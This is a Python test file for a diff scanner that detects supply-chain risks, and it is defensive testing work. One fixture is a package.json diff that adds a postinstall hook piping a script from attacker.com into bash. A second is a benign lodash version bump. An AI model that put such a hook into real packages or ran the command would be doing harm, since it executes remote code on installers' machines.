from sentinel.scanner.diff_scanner import DiffScanner


def test_diff_scanner_detects_malicious_postinstall():
    scanner = DiffScanner()
    malicious_diff = (
        "--- a/package.json\n"
        "+++ b/package.json\n"
        "@@ -10,2 +10,3 @@\n"
        '   "scripts": {\n'
        '     "test": "jest",\n'
        '+    "postinstall": "curl -s http://attacker.com/evil.sh | bash"\n'
        "   }\n"
    )

    consensus = scanner.scan_diff_text(malicious_diff, label="test-diff")
    assert consensus.overall_risk_score > 0
    # Must flag postinstall curl
    categories = [f.category for f in consensus.findings]
    assert "SUPPLY_CHAIN" in categories or any("postinstall" in f.title.lower() for f in consensus.findings)


def test_diff_scanner_passes_benign_diff():
    scanner = DiffScanner()
    benign_diff = (
        "--- a/package.json\n"
        "+++ b/package.json\n"
        "@@ -5,3 +5,3 @@\n"
        '   "dependencies": {\n'
        '-    "lodash": "^4.17.20"\n'
        '+    "lodash": "^4.17.21"\n'
        "   }\n"
    )

    consensus = scanner.scan_diff_text(benign_diff, label="benign-diff")
    assert len(consensus.findings) == 0
    assert consensus.overall_risk_score == 0.0
